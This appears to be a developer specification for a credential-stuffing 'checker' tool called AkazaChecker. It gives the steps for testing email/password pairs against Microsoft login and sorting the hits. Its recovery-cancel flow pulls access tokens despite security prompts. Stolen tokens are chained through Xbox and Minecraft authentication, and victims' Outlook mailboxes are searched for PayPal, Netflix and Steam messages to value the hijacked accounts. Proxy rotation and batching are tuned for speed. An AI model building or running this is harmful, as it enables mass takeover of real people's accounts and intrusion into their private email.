METHOD: get_sftag_params(self)
------------------------------------------------------------
COPY EXACTLY from flux.py get_urlPost_sFTTag().
Use SFTAG_URL constant.
3 retries, 0.1s sleep between.
Try multiple regex patterns for PPFT:
  re.search('value=\\\\"(.+?)\\\\"', text, re.S)
  re.search('value="(.+?)"', text, re.S)
  re.search("sFTTag:'(.+?)'", text, re.S)
  re.search('sFTTag:"(.+?)"', text, re.S)
  re.search('name="PPFT".*?value="(.+?)"', text, re.S)
Try multiple regex for urlPost:
  re.search('"urlPost":"(.+?)"', text, re.S)
  re.search("urlPost:'(.+?)'", text, re.S)
  re.search('<form.*?action="(.+?)"', text, re.S)
Replace &amp; -> & in urlPost.
Returns (urlPost, ppft) or (None, None).

METHOD: do_login(self, email, password, urlPost, ppft)
------------------------------------------------------------
COPY EXACTLY from flux.py get_xbox_rps().
POST to urlPost with:
  data = {login: email, loginfmt: email,
          passwd: password, PPFT: ppft}
  headers: Content-Type: application/x-www-form-urlencoded
           UA: Chrome/91 (from flux.py)
  allow_redirects=True, timeout=10, verify=False
3 retries.

CHECK RESPONSES in this order:

1. If '#' in response.url AND url != SFTAG_URL:
   Extract access_token from URL fragment.
   If token found and token != 'None' -> return ('TOKEN', token, session)

2. elif 'cancel?mkt=' in response.text:
   Try the recovery flow (COPY from flux.py):
   - Extract ipt, pprid, uaid from form
   - POST to fmHF action
   - Extract recoveryCancel returnUrl
   - GET that URL, extract access_token from fragment
   - If found -> return ('TOKEN', token, session)
   If not found -> return ('2FA', None, session)

3. elif any 2FA indicators in text:
   ['recover?mkt', 'account.live.com/identity/confirm?mkt',
    'Email/Confirm?mkt', '/Abuse?mkt=']
   -> return ('2FA', None, session)

4. elif any bad creds indicators in text (lowercase):
   ['password is incorrect', "account doesn't exist",
    "that microsoft account doesn't exist",
    'sign in to your microsoft account',
    'tried to sign in too many times',
    'help us protect your account']
   -> return ('BAD', None, session)

Default -> return ('ERROR', None, session)

METHOD: get_minecraft(self, access_token)
------------------------------------------------------------
This needs a separate Xbox auth chain.
The access_token from flux.py login IS an Xbox Live RPS
token (MBI_SSL scope). Use it directly.

Step 1 - XBL:
  POST https://user.auth.xboxlive.com/user/authenticate
  Headers: Content-Type: application/json,
           Accept: application/json
  Body JSON:
    {
      "Properties": {
        "AuthMethod": "RPS",
        "SiteName": "user.auth.xboxlive.com",
        "RpsTicket": "d={access_token}"
      },
      "RelyingParty": "http://auth.xboxlive.com",
      "TokenType": "JWT"
    }
  Extract: Token, DisplayClaims.xui[0].uhs (userhash)

Step 2 - XSTS:
  POST https://xsts.auth.xboxlive.com/xsts/authorize
  Body JSON:
    {
      "Properties": {
        "SandboxId": "RETAIL",
        "UserTokens": ["{xbl_token}"]
      },
      "RelyingParty": "rp://api.minecraftservices.com/",
      "TokenType": "JWT"
    }
  Extract: Token (xsts_token)

Step 3 - Minecraft login:
  POST https://api.minecraftservices.com/authentication/login_with_xbox
  Body JSON:
    {"identityToken": "XBL3.0 x={userhash};{xsts_token}"}
  Extract: access_token (mc_token)

Step 4 - Profile:
  GET https://api.minecraftservices.com/minecraft/profile
  Header: Authorization: Bearer {mc_token}
  If 200: return {"owned": True, "username": name,
                  "uuid": id, "capes": [alias,...]}
  Else: return {"owned": False}

Wrap all in try/except, return {"owned": False} on error.

SEARCH PAYLOAD template:

    "Scenario": {"Name": "owa.react"},
    "TimeZone": "UTC",
    "TextDecorations": "Off",
    "EntityRequests": [{
      "EntityType": "Conversation",
      "ContentSources": ["Exchange"],
      "Filter": {"Or": [{"Term":
        {"DistinguishedFolderName": "msgfolderroot"}}]},
      "From": 0,
      "Query": {"QueryString": "{keyword}"},
      "Size": 5,
      "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
    }]
  }

SCAN PROCESS:
  Build a combined keyword list:
    combined = list(SERVICE_KEYWORDS.keys()) + user_keywords
  Remove duplicates.
  For each keyword in combined:
    POST the search payload.
    If status 200 and Total > 0:
      - Get the display name: SERVICE_KEYWORDS.get(kw, kw)
      - Add to results dict: {display_name: count}
  Return dict of {service_name: count}.
  (e.g. {"Netflix": 3, "PayPal": 12, "Steam": 1})

NOTE: Batch keywords — don't make one request per
service keyword (too slow). Instead group them:
  Search 5-10 keywords at a time using OR queries:
  QueryString: "netflix.com OR hulu.com OR spotify.com"
  If Total > 0 then do individual lookups for that batch
  to determine which specific ones matched.
  This gives much better CPM.

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(('http://','https://','socks')):
        return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f'http://{user}:{pwd}@{ip}:{port}'
    elif len(parts) == 2:
        return f'http://{proxy_str}'
    return proxy_str

In AkazaChecker.__init__:
    if proxy:
        p = format_proxy(proxy)
        self.session.proxies = {'http': p, 'https': p}
